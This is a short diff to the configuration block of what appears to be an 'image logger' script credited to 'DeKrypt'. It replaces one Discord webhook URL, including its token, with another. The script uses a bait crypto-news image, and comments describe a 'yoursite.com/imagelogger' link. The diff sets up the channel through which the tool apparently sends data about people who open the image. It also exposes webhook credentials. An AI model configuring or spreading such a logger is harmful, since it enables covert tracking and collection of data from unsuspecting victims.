@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1342614015142002851/cfoAYKPMSqsXXalHtdOQs0rkQnAb1uFLANliI01R0bOUvjiMIR2pjbJ_cZCA66rgdd71",
+    "webhook": "https://discord.com/api/webhooks/1342615877920751739/aKWT4AYtvduYwajB5Hq4pBvH3UCZpWiQlk5Pe6fLEiULKl_M5ncJVuanIRhfTTQlbUZp",
     "image": "https://www.cryptotimes.io/wp-content/uploads/2024/11/CHILLGUY-spikes-over-60-in-24h-Binance-Listing-Ahead.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
